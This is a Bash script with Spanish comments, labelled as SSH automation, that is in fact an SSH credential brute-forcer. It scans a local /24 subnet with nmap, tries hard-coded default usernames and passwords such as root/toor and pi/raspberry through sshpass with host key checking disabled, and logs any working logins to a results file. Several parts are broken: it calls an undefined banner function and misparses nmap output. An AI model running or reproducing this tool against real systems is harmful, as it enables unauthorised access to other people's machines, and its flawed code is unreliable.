#!/bin/bash
# Script de Automatización para Servicios SSH
# Desarrollado por kaleth corcho
# Versión: 1.0
# Fecha: [12/04/2026]
# Colores para salida
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color
# Configuración
THREADS=4
TIMEOUT=10
OUTPUT_DIR="ssh_exploits_$(date +%Y%m%d_%H%M%S)"
LOG_FILE="$OUTPUT_DIR/exploit.log"
RESULTS_FILE="$OUTPUT_DIR/valid_credentials.txt"	
# Crear directorios de salida
mkdir -p "$OUTPUT_DIR"

# Registrar inicio
echo "=== Inicio de Script $(date) ===" >> "$LOG_FILE"

# Función para probar credenciales
test_credentials() {
    local host=$1
    local user=$2
    local pass=$3
    local port=$4

    echo -e "[*] Probando ${YELLOW}$user:$pass${NC} en ${YELLOW}$host:$port${NC}"

    # Registrar intento
    echo "Intento: $host $user $pass" >> "$LOG_FILE"

    if timeout $TIMEOUT sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=$TIMEOUT "$user@$host" -p "$port" "id" 2>/dev/null; then
        echo -e "${GREEN}[+] Éxito! Credenciales válidas: $user:$pass${NC}"
        echo "$host:$port | $user:$pass" >> "$RESULTS_FILE"
        return 0
    else
        return 1
    fi
}

# Función para enumerar servicios SSH
scan_ssh_services() {
    echo "[*] Escaneando servicios SSH en la red..."

    # Usar nmap para encontrar servicios SSH
    nmap -p 22 --open -sV -T4 192.168.1.0/24 -oN "$OUTPUT_DIR/ssh_scan.txt" 2>/dev/null

    # Extraer hosts con SSH abierto
    grep "open" "$OUTPUT_DIR/ssh_scan.txt" | awk '{print $NF}' > "$OUTPUT_DIR/ssh_hosts.txt"

    echo "[*] Se encontraron $(wc -l < "$OUTPUT_DIR/ssh_hosts.txt") hosts con SSH abierto"
}

# Función para probar usuarios y contraseñas comunes
brute_force_ssh() {
    local host=$1
    local port=$2

    echo -e "\n[*] Probando credenciales comunes en ${YELLOW}$host:$port${NC}"

    # Lista de usuarios y contraseñas comunes
    USERS=("root" "admin" "user" "test" "ubuntu" "debian" "pi" "oracle" "mysql" "postgres")
    PASSWORDS=("password" "123456" "qwerty" "admin" "root" "toor" "ubuntu" "debian" "raspberry" "letmein")

    # Convertir arrays
    for user in "${USERS[@]}"; do
        for pass in "${PASSWORDS[@]}"; do
            if test_credentials "$host" "$user" "$pass" "$port"; then
                break 2
            fi
        done
    done
}

# Función principal
main() {
    banner

    # Verificar dependencias
    if ! command -v nmap &>/dev/null; then
        echo -e "${RED}[-] Error: nmap no está instalado${NC}"
        echo "Instálalo con: sudo apt-get install nmap -y"
        exit 1
    fi

    if ! command -v sshpass &>/dev/null; then
        echo -e "${RED}[-] Error: sshpass no está instalado${NC}"
        echo "Instálalo con: sudo apt-get install sshpass -y"
        exit 1
    fi

    # Escanear servicios SSH
    scan_ssh_services

    # Si no hay hosts con SSH, salir
    if [ ! -s "$OUTPUT_DIR/ssh_hosts.txt" ]; then
        echo -e "${RED}[-] No se encontraron servicios SSH abiertos${NC}"
        exit 1
    fi

    # Probar en cada host encontrado
    while read -r host; do
        # Obtener el puerto (en caso de que sea diferente de 22)
        port=$(echo "$host" | cut -d: -f2)
        host=$(echo "$host" | cut -d: -f1)
        port=${port:-22}

        echo -e "\n[*] Probando host: ${YELLOW}$host${NC} en puerto ${YELLOW}$port${NC}"
        brute_force_ssh "$host" "$port"

    done < "$OUTPUT_DIR/ssh_hosts.txt"

    # Mostrar resultados
    if [ -f "$RESULTS_FILE" ] && [ -s "$RESULTS_FILE" ]; then
        echo -e "\n${GREEN}[+] Se encontraron las siguientes credenciales válidas:${NC}"
        echo "---------------------------------------------------"
        cat "$RESULTS_FILE"
        echo "---------------------------------------------------"
        echo -e "\n[!] Los resultados también se han guardado en $RESULTS_FILE"
    else
        echo -e "${RED}[-] No se encontraron credenciales válidas${NC}"
    fi

    # Mostrar resumen
    echo -e "\n=== Resumen de la ejecución ==="
    echo "Fecha: $(date)"
    echo "Hosts escaneados: $(wc -l < "$OUTPUT_DIR/ssh_hosts.txt")"
    echo "Resultados guardados en: $OUTPUT_DIR"
    echo "$(date)" >> "$LOG_FILE"
}

# Ejecutar script
main
